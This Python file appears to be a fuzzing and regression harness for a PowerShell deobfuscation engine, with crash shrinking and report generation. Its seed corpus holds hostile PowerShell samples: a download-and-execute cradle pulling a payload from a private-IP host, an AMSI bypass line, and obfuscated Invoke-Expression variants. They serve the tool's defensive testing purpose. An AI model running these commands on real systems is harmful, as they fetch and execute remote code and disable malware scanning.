"""
PowerShell AST Deobfuscation Fuzzing Runner & Regression Harness.
Executes batch fuzzing iterations, handles unexpected crashes, performs delta-debugging input shrinking,
and produces Text, Markdown, and JSON forensic reports.
"""

import json
import os
import sys
import time
import traceback
from typing import Any, Dict, List, Optional, Tuple

from .ast_exporter import extract_ast_metrics
from .benchmark_corpus import get_corpus
from .deobfuscator_engine import PowerShellDeobfuscator
from .fuzz_models import (
    FuzzExecutionResult,
    FuzzMutationRecord,
    FuzzStatus,
    FuzzSummary,
    FuzzTestCase,
    MutationStrategy,
)
from .fuzz_mutator import PowerShellScriptMutator
from .lexer import PowerShellLexer
from .parser import PowerShellParser


DEFAULT_BASE_SNIPPETS: List[Tuple[str, str]] = [
    ("iex_cradle", "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')"),
    ("format_string", "('{1}{0}' -f 'Expression', 'Invoke-') 'calc.exe'"),
    ("subexpression_concat", "$('In'+'voke')-$('Ex'+'pression') 'notepad.exe'"),
    ("env_var_indexing", "$cmd = $env:COMSPEC[4,15,25] -join ''; & $cmd 'calc.exe'"),
    ("casing_backticks", "i`Nv`Ok`E-e`Xp`Re`Ss`Io`N 'whoami'"),
    ("type_cast_join", "([char[]](73, 69, 88) -join '') 'Write-Host Clean'"),
    ("pipeline_foreach", "(105, 101, 120 | % { [char]$_ }) -join '' | &"),
    ("dead_decoy_branch", "if ($false) { $x = 1 } else { Write-Output 'Safe Execution' }"),
    ("amsi_patch_fragment", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"),
    ("execution_policy_flag", "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command 'Write-Host hello'"),
]


class PowerShellFuzzRunner:
    """
    Automated regression fuzzing harness that exercises the lexer, parser, and deobfuscation engine.
    """

    def __init__(self, seed: int = 42, enable_shrink: bool = True):
        self.seed = seed
        self.enable_shrink = enable_shrink
        self.mutator = PowerShellScriptMutator(seed=seed)
        self.deobfuscator = PowerShellDeobfuscator()

    def get_base_corpus(self, include_benchmarks: bool = True) -> List[Tuple[str, str]]:
        """Compiles standard base snippets and representative benchmark corpus samples."""
        corpus: List[Tuple[str, str]] = list(DEFAULT_BASE_SNIPPETS)
        if include_benchmarks:
            for s in get_corpus():
                corpus.append((s.name, s.obfuscated_script))
        return corpus

    def run_case(self, test_case: FuzzTestCase) -> FuzzExecutionResult:
        """Executes a single test case through the full compiler pipeline and records telemetry."""
        start_time = time.perf_counter()
        code = test_case.mutated_code
        applied_names = [m.strategy.value if isinstance(m.strategy, MutationStrategy) else str(m.strategy) for m in test_case.mutations]

        ast_node_count = 0
        ast_depth = 0
        deobfuscated_code: Optional[str] = None
        is_idempotent = True

        try:
            # 1. Lexical tokenization
            lexer = PowerShellLexer(code)
            tokens = lexer.tokenize()

            # 2. Syntax parsing
            parser = PowerShellParser(tokens)
            ast = parser.parse()
            metrics = extract_ast_metrics(ast)
            ast_node_count = metrics.get("total_nodes", 0)
            ast_depth = metrics.get("max_depth", 0)

            # 3. Multi-pass fixed-point deobfuscation
            deobfuscated_code = self.deobfuscator.deobfuscate(code)

            # 4. Idempotency test: deobfuscating the output again must not crash or loop
            try:
                second_pass = self.deobfuscator.deobfuscate(deobfuscated_code)
                is_idempotent = (second_pass == deobfuscated_code)
            except Exception:
                is_idempotent = False

            duration_ms = (time.perf_counter() - start_time) * 1000.0

            return FuzzExecutionResult(
                test_id=test_case.test_id,
                seed=test_case.seed,
                status=FuzzStatus.PASS,
                duration_ms=duration_ms,
                mutations_applied=applied_names,
                original_length=len(test_case.original_code),
                mutated_length=len(code),
                deobfuscated_code=deobfuscated_code,
                ast_node_count=ast_node_count,
                ast_depth=ast_depth,
                is_idempotent=is_idempotent,
            )

        except SyntaxError as e:
            # Gracefully handled syntax error
            duration_ms = (time.perf_counter() - start_time) * 1000.0
            return FuzzExecutionResult(
                test_id=test_case.test_id,
                seed=test_case.seed,
                status=FuzzStatus.HANDLED_SYNTAX_ERROR,
                duration_ms=duration_ms,
                mutations_applied=applied_names,
                original_length=len(test_case.original_code),
                mutated_length=len(code),
                error_message=str(e),
                exception_type="SyntaxError",
            )

        except Exception as e:
            # Unexpected unhandled crash or internal failure
            duration_ms = (time.perf_counter() - start_time) * 1000.0
            exc_type = type(e).__name__
            tb_str = traceback.format_exc(limit=4)

            shrunk: Optional[str] = None
            if self.enable_shrink:
                shrunk = self.shrink_failing_case(code)

            return FuzzExecutionResult(
                test_id=test_case.test_id,
                seed=test_case.seed,
                status=FuzzStatus.UNEXPECTED_CRASH,
                duration_ms=duration_ms,
                mutations_applied=applied_names,
                original_length=len(test_case.original_code),
                mutated_length=len(code),
                error_message=str(e),
                exception_type=exc_type,
                traceback_snippet=tb_str,
                shrunk_reproducer=shrunk,
            )

    def shrink_failing_case(self, failing_code: str, max_steps: int = 25) -> str:
        """
        Delta-debugging bisecting shrinker: minimizes a crashing script to its smallest reproducer.
        """
        def triggers_crash(snippet: str) -> bool:
            try:
                tokens = PowerShellLexer(snippet).tokenize()
                ast = PowerShellParser(tokens).parse()
                PowerShellDeobfuscator().deobfuscate(snippet)
                return False
            except SyntaxError:
                return False
            except Exception:
                return True

        current = failing_code
        lines = current.splitlines()

        # Step 1: Line removal
        if len(lines) > 1:
            for _ in range(min(max_steps, len(lines))):
                for i in range(len(lines)):
                    candidate_lines = lines[:i] + lines[i + 1:]
                    candidate = "\n".join(candidate_lines)
                    if candidate.strip() and triggers_crash(candidate):
                        lines = candidate_lines
                        current = candidate
                        break

        # Step 2: Binary split / chunk reduction
        tokens = current.split()
        if len(tokens) > 2:
            step = 0
            while len(tokens) > 2 and step < max_steps:
                step += 1
                mid = len(tokens) // 2
                first_half = " ".join(tokens[:mid])
                if triggers_crash(first_half):
                    tokens = tokens[:mid]
                    current = first_half
                    continue
                second_half = " ".join(tokens[mid:])
                if triggers_crash(second_half):
                    tokens = tokens[mid:]
                    current = second_half
                    continue
                break

        return current.strip()

    def run_fuzz_harness(
        self,
        iterations: int = 50,
        strategies: Optional[List[MutationStrategy]] = None,
        use_corpus: bool = True,
        custom_samples: Optional[List[str]] = None,
    ) -> FuzzSummary:
        """
        Executes N iterations of randomized mutation stress fuzzing against the corpus.
        """
        corpus = []
        if custom_samples:
            for i, s in enumerate(custom_samples):
                corpus.append((f"custom_{i}", s))
        else:
            corpus = self.get_base_corpus(include_benchmarks=use_corpus)

        results: List[FuzzExecutionResult] = []
        strategy_counts: Dict[str, int] = {}
        total_duration = 0.0

        for i in range(iterations):
            current_seed = self.seed + i
            self.mutator.set_seed(current_seed)

            # Pick a base snippet deterministically
            base_name, base_code = corpus[i % len(corpus)]
            test_case = self.mutator.generate_mutated_case(
                original_code=base_code,
                name=base_name,
                strategies=strategies,
                num_mutations=self.mutator.rng.randint(2, 4),
            )

            for strat in test_case.target_strategies:
                key = strat.value if isinstance(strat, MutationStrategy) else str(strat)
                strategy_counts[key] = strategy_counts.get(key, 0) + 1

            res = self.run_case(test_case)
            results.append(res)
            total_duration += res.duration_ms

        passed = sum(1 for r in results if r.status == FuzzStatus.PASS)
        handled = sum(1 for r in results if r.status == FuzzStatus.HANDLED_SYNTAX_ERROR)
        crashes = sum(1 for r in results if r.status == FuzzStatus.UNEXPECTED_CRASH)
        regressions = sum(1 for r in results if r.status == FuzzStatus.REGRESSION)
        timeouts = sum(1 for r in results if r.status == FuzzStatus.TIMEOUT)

        return FuzzSummary(
            total_cases=len(results),
            passed=passed,
            handled_syntax_errors=handled,
            unexpected_crashes=crashes,
            regressions=regressions,
            timeouts=timeouts,
            total_duration_ms=total_duration,
            strategy_counts=strategy_counts,
            results=results,
        )

    def to_text_report(self, summary: FuzzSummary) -> str:
        """Renders human-readable plain text report."""
        lines = [
            "================================================================================",
            "        POWERSHELL AST DEOBFUSCATOR - REGRESSION FUZZING HARNESS REPORT        ",
            "================================================================================",
            f"Total Test Runs         : {summary.total_cases}",
            f"Clean Passes (Valid AST): {summary.passed} ({summary.clean_pass_rate}%)",
            f"Handled Syntax Errors   : {summary.handled_syntax_errors}",
            f"Unexpected Crashes      : {summary.unexpected_crashes}",
            f"Regressions Detected    : {summary.regressions}",
            f"Overall Safety Pass Rate: {summary.pass_rate}%",
            f"Total Execution Time    : {summary.total_duration_ms:.2f} ms",
            "--------------------------------------------------------------------------------",
            "Mutation Strategy Distribution:",
        ]
        for strat, count in sorted(summary.strategy_counts.items(), key=lambda x: -x[1]):
            lines.append(f"  - {strat:<26}: {count} occurrences")

        if summary.crashes:
            lines.append("--------------------------------------------------------------------------------")
            lines.append(f"[!] DETECTED {len(summary.crashes)} UNEXPECTED CRASHES / REGRESSIONS:")
            for c in summary.crashes:
                lines.append(f"  * Case ID: {c.test_id} (Seed: {c.seed}) | Exception: {c.exception_type}")
                lines.append(f"    Message: {c.error_message}")
                if c.shrunk_reproducer:
                    lines.append(f"    Shrunk Reproducer: {c.shrunk_reproducer!r}")
        else:
            lines.append("--------------------------------------------------------------------------------")
            lines.append("[+] Zero unexpected crashes detected across all fuzzing runs. 100% robust.")

        lines.append("================================================================================")
        return "\n".join(lines)

    def to_markdown_report(self, summary: FuzzSummary) -> str:
        """Renders GitHub-flavored Markdown report."""
        lines = [
            "# PowerShell AST Deobfuscation Fuzzing Report",
            "",
            "## Summary Metrics",
            "",
            "| Metric | Value |",
            "|---|---|",
            f"| **Total Test Runs** | `{summary.total_cases}` |",
            f"| **Clean Passes (Valid AST)** | `{summary.passed}` ({summary.clean_pass_rate}%) |",
            f"| **Handled Syntax Errors** | `{summary.handled_syntax_errors}` |",
            f"| **Unexpected Crashes** | `{summary.unexpected_crashes}` |",
            f"| **Overall Safety Pass Rate** | **{summary.pass_rate}%** |",
            f"| **Execution Time** | `{summary.total_duration_ms:.2f} ms` |",
            "",
            "## Mutation Strategy Breakdown",
            "",
            "| Strategy | Invocations |",
            "|---|---|",
        ]
        for strat, count in sorted(summary.strategy_counts.items(), key=lambda x: -x[1]):
            lines.append(f"| `{strat}` | {count} |")

        if summary.crashes:
            lines.extend([
                "",
                "## Detected Crashes & Repro Cases",
                "",
                "| Case ID | Seed | Exception | Error Message | Shrunk Reproducer |",
                "|---|---|---|---|---|",
            ])
            for c in summary.crashes:
                shrunk = f"`{c.shrunk_reproducer}`" if c.shrunk_reproducer else "N/A"
                lines.append(f"| `{c.test_id}` | `{c.seed}` | `{c.exception_type}` | {c.error_message} | {shrunk} |")
        else:
            lines.extend([
                "",
                "> [!NOTE]",
                "> Zero unhandled crashes or regressions detected. The parser, lexer, and normalization engine demonstrated complete fault tolerance.",
            ])

        return "\n".join(lines)

    def to_json_report(self, summary: FuzzSummary) -> str:
        """Renders machine-readable JSON telemetry."""
        return summary.to_json(indent=2)

    def save_report(self, report_content: str, file_path: str) -> None:
        """Persists fuzzing report to a destination file with UTF-8 encoding."""
        os.makedirs(os.path.dirname(os.path.abspath(file_path)), exist_ok=True)
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(report_content + "\n")
